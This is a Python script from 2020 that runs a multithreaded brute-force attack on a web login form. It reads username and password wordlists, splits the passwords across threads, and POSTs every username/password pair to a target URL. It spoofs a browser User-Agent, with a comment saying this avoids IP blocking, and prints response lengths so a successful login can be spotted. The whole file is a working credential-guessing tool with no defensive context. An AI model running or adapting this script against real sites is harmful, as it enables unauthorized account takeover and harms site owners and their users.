#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
__file__    : web_brute_command.py
__time__    : 2020/6/17 14:56
__author__  : crisimple
__github__ :  https://crisimple.github.io/
"""

import optparse
import math
import threading
import requests

# 初始化 parse 对象
parse = optparse.OptionParser()

# 初始化对象的属性
parse.usage = "web_brute_command.py -s url -u user_file -p pass_file -t threads"

# 添加参数
parse.add_option(
    "-s", "--site", dest="website", help="website to test.", action="store", type="string", metavar="URL"
)
parse.add_option(
    "-u", "--userfile", dest="userfile", help="username from file", action="store", type="string", metavar="USERFILE"
)
parse.add_option(
    "-p", "--passwordfile", dest="passwordfile", help="password from file", action="store", type="string", metavar="PASSWORDFILE"
)
parse.add_option(
    "-t", "--threads", dest="threads", help="number of threads", action="store", type="int", metavar="THREADS"
)

# 存储提交的命令行参数
(options, args) = parse.parse_args()

# 测试输出数据
# print(options.website)
# print(options.userfile)
# print(options.passwordfile)
# print(options.threads)

# 确定 payload()
ths = options.threads
# print(ths)
pass_dic = options.passwordfile
# print(pass_dic)
user_dict = options.userfile
# print(user_dict)
site = options.website
print("site: ", site)

# 新建一个密码字典列表 [[], [], []]
password_list = []
threads_list = []

# 根据线程数，确定每一个项当中内容的行数
# 第一步：读取所有密码字典中的内容到要给的列表中，确定字典的行数
thread_per_num = 0
with open(pass_dic , "r") as f:
    temp_list = f.readlines()
    total_raws = len(temp_list)

    # 第二步：使用得到的临时表的项数 除以 线程数，确定每一个线程数中读取的行数
    result = total_raws / ths

    # 第三步：向下取整保证每行数据都能被取到
    result = math.floor(result)
    thread_per_num = result

    flag = 0
    for line in temp_list:
        flag += 1
        threads_list.append(line.strip())
        if flag == result:
            flag = 0
            password_list.append(threads_list)
            threads_list = []

    for line in threads_list:
        password_list[ths-1].append(line)

# print(thread_per_num)
# print(password_list)
# print(password_list[ths-1])

# payload --> password_list 结合 用户名字 字典进行确定
# 功能函数：即暴力破解 site 的用户名密码
def scan(payloads):
    # print(payloads)
    # print(type(payloads))
    user_name = payloads["user"]
    pass_word = payloads["password"]
    for per_password in pass_word:
        # 防止被IP
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36"
        }
        r = requests.post(
            url=site,
            data={
                "username": user_name,
                "password": per_password
            },
            headers = headers
        )
        print(site + ":" + "username: " + user_name + "password: " + per_password + " length: " + str(len(r.text)))

# 线程列表
ths_list = []
with open(user_dict, "r") as f:
    users = f.readlines()
    for user in users:
        user = user.strip()
        for password in password_list:
            payload = {
                "user": user,
                "password": password
            }
            # print(payload)
            ths_list.append(threading.Thread(target=scan, args=(payload, )))

for th in ths_list:
    th.start()
